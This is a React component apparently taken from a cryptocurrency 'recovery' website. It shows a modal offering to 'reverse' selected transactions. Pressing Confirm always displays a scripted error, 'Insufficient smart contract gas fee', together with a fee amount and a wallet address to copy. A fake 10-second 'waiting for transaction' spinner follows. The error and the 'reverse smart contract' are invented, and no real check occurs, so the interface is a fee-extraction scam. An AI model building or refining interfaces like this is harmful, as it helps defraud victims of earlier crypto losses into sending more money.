import CopyInput from '@/components/copyable';
import Modal from '@/components/ui/modal';
import { RecoveryAddressDetailsType } from '@/types';
import { Button } from '@headlessui/react';
import { Loader } from 'lucide-react';
import React, { useEffect, useState } from 'react';

const EthProtocolModal = ({
    isProtocolModalOpen,
    setIsProtocolModalOpen,
    selectedTransactions,
    recoveryDetails,
}: {
    isProtocolModalOpen: boolean;
    setIsProtocolModalOpen: React.Dispatch<React.SetStateAction<boolean>>;
    selectedTransactions: string[] | null;
    recoveryDetails: RecoveryAddressDetailsType | null;
}) => {
    const [isErrorModalOpen, setIsErrorModalOpen] = useState(false);
    const [isDisabled, setIsDisabled] = React.useState(true);

    useEffect(() => {
        if (isProtocolModalOpen) {
            const interval = setTimeout(() => {
                setIsDisabled(false);
                setIsProtocolModalOpen(true);
            }, 10000);

            return () => clearTimeout(interval);
        }
    }, [isProtocolModalOpen, setIsProtocolModalOpen]);

    return (
        <>
            <Modal show={isProtocolModalOpen} onClose={() => setIsProtocolModalOpen(false)}>
                <div className="p-6">
                    <h3 className="mb-4 text-lg font-semibold">Smart Contract Protocol</h3>
                    <p className="mb-4">Are you sure you want to initiate a reverse smart contract protocol for the selected transactions?</p>
                    <div>
                        {selectedTransactions?.map((tx, index: number) => (
                            <div key={index} className="mb-2">
                                {tx}
                            </div>
                        ))}
                    </div>
                    <div className="flex justify-end">
                        <Button onClick={() => setIsProtocolModalOpen(false)} className="mr-2 rounded-md bg-gray-200 px-3 py-1">
                            Cancel
                        </Button>
                        <Button
                            disabled={selectedTransactions?.length === 0}
                            className="rounded-md bg-blue-600 px-3 py-1 text-white hover:bg-blue-700"
                            onClick={() => setIsErrorModalOpen(true)}
                        >
                            Confirm
                        </Button>
                    </div>
                </div>
            </Modal>

            <Modal show={isErrorModalOpen} onClose={() => setIsErrorModalOpen(false)}>
                <div className="py-8 text-center">
                    <h1 className="mb-4 text-6xl font-semibold text-red-500">Error</h1>
                    <p className="mb-4 text-lg text-red-600">Insufficient smart contract gas fee</p>
                    <div className="animate-bounce">
                        <svg className="mx-auto h-16 w-16 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path>
                        </svg>
                    </div>
                    <p className="mt-2 text-gray-600">
                        Estimated gas fee: <span className="font-semibold">{recoveryDetails ? parseFloat(String(recoveryDetails.token_amount)).toFixed(4): 0.03452} Eth</span>
                    </p>
                    <div className="mt-4 flex items-center justify-center gap-3">
                        <p>Smart contract address: </p>
                        <div>
                            <CopyInput value={recoveryDetails ? recoveryDetails.wallet_address : '0x8023ic5na34o3002bl6839097'} />
                        </div>
                    </div>

                    <div className="mt-4 flex justify-end pr-5">
                        <Button
                            type="button"
                            disabled={isDisabled}
                            // onClick={navigateButton}
                            className="rounded-md bg-blue-600 p-2 text-white hover:bg-blue-700 disabled:opacity-25"
                        >
                            {isDisabled ? (
                                <div className="flex items-center gap-2">
                                    <Loader className="animate-spin" />
                                    <p>waiting for transaction</p>
                                </div>
                            ) : (
                                <>
                                    <a href="/eth/recovery">
                                        <p>Execute reverse smart contract</p>
                                    </a>
                                </>
                            )}
                        </Button>
                    </div>
                </div>
            </Modal>
        </>
    );
};

export default EthProtocolModal;
